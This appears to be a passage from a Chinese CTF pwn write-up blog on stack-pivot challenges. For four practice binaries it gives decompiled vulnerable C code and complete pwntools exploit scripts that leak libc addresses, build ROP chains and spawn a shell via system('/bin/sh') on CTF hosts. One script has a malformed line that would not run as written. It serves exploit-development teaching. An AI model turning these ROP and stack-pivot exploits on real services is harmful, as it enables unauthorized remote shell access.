<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    <span class="number">0x401146</span>, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>],     <span class="comment"># pop_rdi; puts_got; puts@plt</span></span><br><span class="line">    <span class="number">0x40112d</span>, bss + offset + <span class="number">0x200</span>, <span class="number">0x40119e</span>, <span class="comment"># pop_rbp; read -&gt; next stage</span></span><br><span class="line">    cyclic(<span class="number">0x50</span>),</span><br><span class="line">    bss - <span class="number">0x8</span>, leave_ret                      <span class="comment"># leave; ret</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p> 0x401146, elf.got[‘puts’], elf.plt[‘puts’]写了puts的地址的payload。</p>
<p> 0x40112d, bss + offset + 0x200, 0x40119e, # pop_rbp; read -&gt; next stage；利用pop_rbp再次利用read。</p>
<p>cyclic(0x50)–&gt;0x401146, elf.got[‘puts’], elf.plt[‘puts’]和0x40112d, bss + offset + 0x200, 0x40119e加在一起是0x30+0x50&#x3D;0x80。</p>
<p>bss - 0x8, leave_ret  ;将栈迁移到 bss - 0x8的位置。pop_rbp是怎么利用的呢，首先read读入这串payload后先执行 0x401146,     </p>
<p>elf.got[‘puts’], elf.plt[‘puts’]泄露puts的地址，然后pop_rbp。rbp就储存了bss+offset + 0x200的位置，接着执行0x40119e，从bss + offset + </p>
<p>0x200的位置开始read。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    pop_rdi := <span class="number">0x401146</span>,</span><br><span class="line">    binsh_addr,</span><br><span class="line">    system_addr</span><br><span class="line">).ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span> - <span class="number">0x8</span>) + p64(<span class="number">0x4011c8</span>)</span><br></pre></td></tr></table></figure>

<p>payload &#x3D; flat(<br>    pop_rdi :&#x3D; 0x401146,<br>    binsh_addr,<br>    system_addr<br>).ljust(0x80, b’\x00’)是构造system(&#x2F;bin&#x2F;sh) </p>
<p>payload +&#x3D; p64(bss + 0x200 - 0x8) + p64(0x4011c8)完成栈迁移。</p>
<h4 id="Black-Watch-入群题-PWN1"><a href="#Black-Watch-入群题-PWN1" class="headerlink" title="[Black Watch 入群题]PWN1"></a>[Black Watch 入群题]PWN1</h4><p>这题不难记录一下题目和exp就可以了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vul_function();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodBye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);   </span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200u</span>);  <span class="comment">//s在bss段上</span></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到远程服务</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27611</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境参数（架构、操作系统、日志等级）</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载本地 ELF 文件</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取程序中的符号地址</span></span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x08048513</span>  <span class="comment"># main 函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次发送 payload：泄露 write 的真实地址</span></span><br><span class="line">payload1 = <span class="string">b&#x27;aaaa&#x27;</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收输入提示</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造栈溢出 payload，覆盖返回地址，为下一次调用做准备</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p32(<span class="number">0x0804A300</span>) + p32(<span class="number">0x08048511</span>)  <span class="comment"># 0x0804A300 为 bss 段地址，0x08048511 为 level 函数返回地址</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收 write 的地址并解析</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&quot;Leaked write address: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 LibcSearcher 查找 libc 基址及 system 和 &quot;/bin/sh&quot; 地址</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - obj.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次交互：发送调用 system(&quot;/bin/sh&quot;) 的 payload</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line">payload3 = <span class="string">b&#x27;aaaa&#x27;</span> + p32(sys_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次接收提示</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次构造栈溢出 payload，确保程序流正确执行</span></span><br><span class="line">payload4 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p32(<span class="number">0x0804A300</span>) + p32(<span class="number">0x08048511</span>)</span><br><span class="line">p.send(payload4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式，获取 shell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h4><p>这题不难也记录一下题目和exp就可以了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">96</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;锛積lcome to Stack bank,Tell me what you want&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x70u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;bank, <span class="number">0x100u</span>LL);  <span class="comment">//bank在bss段</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到远程服务器</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25199</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境参数</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 libc 和 程序的 ELF 文件</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 plt 和 got 中 puts 的地址</span></span><br><span class="line">puts_plt_addr = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常量地址定义</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x400703</span>  <span class="comment"># pop rdi; ret 指令的地址</span></span><br><span class="line">level_ret_addr = <span class="number">0x400699</span>  <span class="comment"># level 函数返回地址</span></span><br><span class="line">bss_addr = <span class="number">0x601080</span>  <span class="comment"># bss 段地址</span></span><br><span class="line">ret_addr = <span class="number">0x4004c9</span>  <span class="comment"># ret 指令地址</span></span><br><span class="line">main_addr = <span class="number">0x400626</span>  <span class="comment"># main 函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个 payload：填充栈并跳转到 level_ret_addr</span></span><br><span class="line">payload1 = <span class="number">0x60</span> * <span class="string">b&#x27;a&#x27;</span> + p64(bss_addr) + p64(level_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二个 payload：执行 ret 多次，然后调用 puts 泄露地址，并回到 main 函数</span></span><br><span class="line">payload2 = p64(ret_addr) * <span class="number">20</span>  <span class="comment"># 使用至少 20 个 ret 指令</span></span><br><span class="line">payload2 += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr)  <span class="comment"># 调用 puts 泄露 puts 地址</span></span><br><span class="line">payload2 += p64(main_addr)  <span class="comment"># 返回到 main 函数</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收泄露的 puts 地址</span></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Leaked puts address: <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 libc 基地址和 shell 地址</span></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">shell = libc_base + <span class="number">0x4526a</span>   system(<span class="string">&quot;/bin/sh&quot;</span>) 地址</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Shell address: <span class="subst">&#123;<span class="built_in">hex</span>(shell)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三个 payload：覆盖返回地址为 shell 地址</span></span><br><span class="line">payload3 = <span class="number">0x60</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;u want\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收提示后发送 &#x27;1&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="Basectf2024-stack-in-stack"><a href="#Basectf2024-stack-in-stack" class="headerlink" title="Basectf2024 stack in stack"></a>Basectf2024 stack in stack</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_4011FE(a1, a2, a3);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It looks like something fell off mick0960.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;An error occurred while reading!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里主要利用了栈迁移，进行第一次泄露puts的地址，并且返回main。再次进行栈迁移，执行ROP链getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;It looks like something fell off mick0960.\n&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">main_addr = <span class="number">0x40124a</span></span><br><span class="line">leave = <span class="number">0x4012f2</span></span><br><span class="line">sub_4011C6 = <span class="number">0x4011dd</span>  <span class="comment">#泄露puts的地址</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(sub_4011C6) + p64(<span class="number">0</span>) + p64(main_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> </span><br><span class="line">payload += p64(buf_addr) + p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause() </span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;It looks like something fell off mick0960.\n&#x27;</span>)</span><br><span class="line">buf_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause() </span></span><br><span class="line"> </span><br><span class="line">system = libc_base + libc.sym.system</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x2a3e5</span> <span class="comment">#在libc.so.6找</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(buf_addr) + p64(leave)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot;  #查找pop_rdi的偏移</span><br></pre></td></tr></table></figure>



<h4 id="SWPUCTF-2024-秋季新生赛-不可名状的东西"><a href="#SWPUCTF-2024-秋季新生赛-不可名状的东西" class="headerlink" title="[SWPUCTF 2024 秋季新生赛]不可名状的东西"></a>[SWPUCTF 2024 秋季新生赛]不可名状的东西</h4><p>栈迁移+ORW</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[128]; // [rsp+0h] [rbp-80h] BYREF</span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  puts(&quot;Please enter your name!&quot;);</span><br><span class="line">  read(0, buf, 0x98uLL);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0x98 - 0x80 -0x08 &#x3D; 16太短栈迁移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动远程连接</span></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">23555</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">leave_ret = <span class="number">0x40120F</span></span><br><span class="line"><span class="comment"># 快捷函数</span></span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: io.sendafter(a, b)</span><br><span class="line">ru = <span class="keyword">lambda</span> a: io.recvuntil(a)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">inter = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">padding = offset + <span class="number">0x8</span></span><br><span class="line">bss = <span class="number">0x404020</span> + <span class="number">0x700</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次栈迁移：将rbp劫持到bss段</span></span><br><span class="line">pay_pivot = cyclic(offset) + p64(bss + offset) + p64(<span class="number">0x4011EF</span>)  <span class="comment"># read -&gt; bss+off</span></span><br><span class="line">sa(<span class="string">b&#x27;Please enter your name!\n&#x27;</span>, pay_pivot)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment"># 泄露puts地址</span></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="number">0x4011C5</span>, <span class="number">0x404018</span>, <span class="number">0x401060</span>,     <span class="comment"># pop_rdi; puts_got; puts@plt</span></span><br><span class="line">    <span class="number">0x4011C8</span>, bss + offset + <span class="number">0x200</span>, <span class="number">0x4011EF</span>, <span class="comment"># pop_rbp; read -&gt; next stage</span></span><br><span class="line">    cyclic(<span class="number">0x50</span>),</span><br><span class="line">    bss - <span class="number">0x8</span>, leave_ret                      <span class="comment"># leave; ret</span></span><br><span class="line">)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析puts地址</span></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造最终payload执行system(&quot;/bin/sh&quot;)</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(leave_ret+<span class="number">1</span>)+p64(leave_ret+<span class="number">1</span>)+p64(leave_ret+<span class="number">1</span>)+p64(<span class="number">0x4011C5</span>)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">payload =payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(bss + <span class="number">0x200</span> - <span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>开始直接用system(&#x2F;bin&#x2F;sh)打失败了</p>
